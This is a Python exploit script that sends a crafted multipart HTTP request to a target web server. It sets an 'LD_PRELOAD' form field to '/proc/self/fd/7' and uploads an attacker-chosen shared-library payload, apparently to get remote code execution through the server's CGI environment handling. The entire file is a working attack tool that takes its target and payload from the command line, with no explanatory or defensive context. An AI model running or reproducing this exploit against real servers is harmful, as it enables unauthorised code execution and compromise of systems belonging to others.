import sys
import socket
import ssl
import random
from urllib.parse import urlparse, ParseResult

PAYLOAD_MAX_LENGTH = 16384 - 200


def exploit(client, parts: ParseResult, payload: bytes):
    path = '/' if not parts.path else parts.path
    boundary = '----%s' % str(random.randint(1000000000000, 9999999999999))
    padding = 'a' * 2000
    content_length = min(len(payload) + 500, PAYLOAD_MAX_LENGTH)
    data = fr'''POST {path} HTTP/1.1
Host: {parts.hostname}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary={boundary}
Content-Length: {content_length}

--{boundary}
Content-Disposition: form-data; name="LD_PRELOAD";

/proc/self/fd/7
--{boundary}
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain

#payload#{padding}
--{boundary}--
'''.replace('\n', '\r\n')
    data = data.encode().replace(b'#payload#', payload)
    client.send(data)
    resp = client.recv(20480)
    print(resp.decode())


def main():
    target = sys.argv[1]
    payload_filename = sys.argv[2]

    with open(payload_filename, 'rb') as f:
        data = f.read()

    if len(data) > PAYLOAD_MAX_LENGTH:
        raise Exception('payload size must not larger than %d', PAYLOAD_MAX_LENGTH)

    parts = urlparse(target)
    port = parts.port
    if not parts.port:
        if parts.scheme == 'https':
            port = 443
        else:
            port = 80

    context = ssl.create_default_context()
    with socket.create_connection((parts.hostname, port), timeout=8) as client:
        if parts.scheme == 'https':
            with context.wrap_socket(client, server_hostname=parts.hostname) as ssock:
                exploit(ssock, parts, data)

        else:
            exploit(client, parts, data)


if __name__ == '__main__':
    main()
